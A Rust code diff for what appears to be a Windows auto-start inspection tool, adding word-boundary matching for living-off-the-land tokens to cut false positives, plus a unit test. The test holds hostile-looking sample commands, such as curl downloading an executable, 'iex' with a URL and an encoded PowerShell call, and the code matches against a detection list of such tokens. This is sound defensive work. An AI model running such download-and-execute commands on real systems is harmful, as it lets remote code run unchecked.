@@ -87,6 +87,44 @@ pub(super) const LOLBIN_ARGS: &[(&str, &str)] = &[
     ("frombase64string", "an inline base64 decode"),
 ];
 
+/// The first living-off-the-land token in `text`, matched on **word
+/// boundaries**.
+///
+/// A bare substring search is not good enough: `iex` occurs inside
+/// `PCIExpress`, which is how a Windows provisioning package came to be
+/// reported as running `Invoke-Expression`. A match only counts when it is not
+/// surrounded by more word characters.
+pub(super) fn lolbin_in(text: &str) -> Option<&'static str> {
+    let hay = text.to_ascii_lowercase();
+    for (needle, why) in LOLBIN_ARGS {
+        let mut from = 0;
+        while let Some(at) = hay[from..].find(needle) {
+            let start = from + at;
+            let end = start + needle.len();
+            // Only guard an edge where the needle itself carries a word
+            // character. `curl ` ends in a space, so what follows it is
+            // naturally a word character and guarding there would reject every
+            // real match.
+            let guard_start = needle.starts_with(|c: char| c.is_alphanumeric());
+            let guard_end = needle.ends_with(|c: char| c.is_alphanumeric());
+            let before_ok = !guard_start
+                || start == 0
+                || !hay[..start]
+                    .chars()
+                    .next_back()
+                    .is_some_and(|c| c.is_alphanumeric());
+            let after_ok = !guard_end
+                || end >= hay.len()
+                || !hay[end..].chars().next().is_some_and(|c| c.is_alphanumeric());
+            if before_ok && after_ok {
+                return Some(why);
+            }
+            from = start + 1;
+        }
+    }
+    None
+}
+
 // --- command line parsing -----------------------------------------------------
 
 /// Split an auto-start command line into its executable and its arguments.
@@ -174,17 +212,14 @@ pub(crate) fn signals_for(entry: &AsepEntry) -> Vec<SysSignal> {
         ));
     }
 
-    let lower = entry.command.to_ascii_lowercase();
-    for (needle, why) in LOLBIN_ARGS {
-        if lower.contains(needle) {
-            out.push(SysSignal::new(
-                format!("autostart command uses {why}"),
-                Category::Persistence,
-                Severity::High,
-                40,
-            ));
-            break; // one finding per entry: the command is the subject, not each token
-        }
+    // One finding per entry: the command is the subject, not each token in it.
+    if let Some(why) = lolbin_in(&entry.command) {
+        out.push(SysSignal::new(
+            format!("autostart command uses {why}"),
+            Category::Persistence,
+            Severity::High,
+            40,
+        ));
     }
     out
 }
@@ -584,6 +619,27 @@ mod tests {
             assert_eq!(sigs.iter().filter(|s| s.label.starts_with("autostart command uses")).count(), 1,
                        "one finding per entry, not one per token");
         }
+    }
+
+    /// The boundary rule has two edges, and each is only guarded where the
+    /// needle carries a word character there.
+    #[test]
+    fn the_word_boundary_rule_holds_at_both_ends() {
+        // Guarded on both sides: rejected inside a longer word.
+        assert!(lolbin_in("C:/Power.Settings.PCIExpress.ppkg").is_none());
+        assert!(lolbin_in("iex http://x.test/a").is_some());
+
+        // `curl ` ends in a space, so what follows is a word character by
+        // construction and must not be guarded.
+        assert!(lolbin_in("cmd /c curl http://198.51.100.7/a -o a.exe").is_some());
+
+        // `-enc` starts with punctuation: only the trailing edge is guarded, so
+        // `-encodedcommand` does not match it (it has its own needle).
+        assert!(lolbin_in("powershell -enc SQBFAFgA").is_some());
+
+        // And nothing ordinary trips it.
+        assert!(lolbin_in(r"C:\Program Files\Vendor\updater.exe --silent").is_none());
+        assert!(lolbin_in("").is_none());
     }
 
     /// Winlogon ships exactly one value per hook; the trailing comma on
